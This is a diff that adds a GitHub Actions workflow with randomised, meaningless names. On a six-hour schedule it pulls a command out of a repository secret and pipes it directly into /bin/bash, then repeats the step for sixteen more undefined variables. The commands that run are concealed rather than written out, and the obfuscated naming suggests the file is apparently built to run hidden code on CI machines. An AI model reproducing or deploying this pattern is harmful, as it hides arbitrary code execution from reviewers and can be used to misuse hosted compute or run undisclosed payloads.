@@ -1,0 +1,34 @@
+name: pangbaozheng5261
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pangbaozheng5261
+        env:
+          kya296: ${{ secrets.kya296 }}
+        run: |
+          echo $kya296 | jq -r .bdof5904 | /bin/bash
+          echo $fyoei2278 | jq -r .xbbwf663 | /bin/bash
+          echo $tfpd24 | jq -r .kk7 | /bin/bash
+          echo $nziph61 | jq -r .t16 | /bin/bash
+          echo $jvlv36874 | jq -r .xntmc53 | /bin/bash
+          echo $q0 | jq -r .c60037 | /bin/bash
+          echo $yt1829 | jq -r .ki410 | /bin/bash
+          echo $vaefm41568 | jq -r .lhwzc7 | /bin/bash
+          echo $mykv31 | jq -r .ggj2329 | /bin/bash
+          echo $tzb4 | jq -r .eg78 | /bin/bash
+          echo $adicg73735 | jq -r .sdk4348 | /bin/bash
+          echo $oseu47252 | jq -r .wn5923 | /bin/bash
+          echo $sn568 | jq -r .edp156 | /bin/bash
+          echo $lrrb45 | jq -r .oaxy9596 | /bin/bash
+          echo $n0357 | jq -r .t85008 | /bin/bash
+          echo $pxsol546 | jq -r .qfbsd85065 | /bin/bash
+          echo $pclnf3119 | jq -r .tt49198 | /bin/bash
+
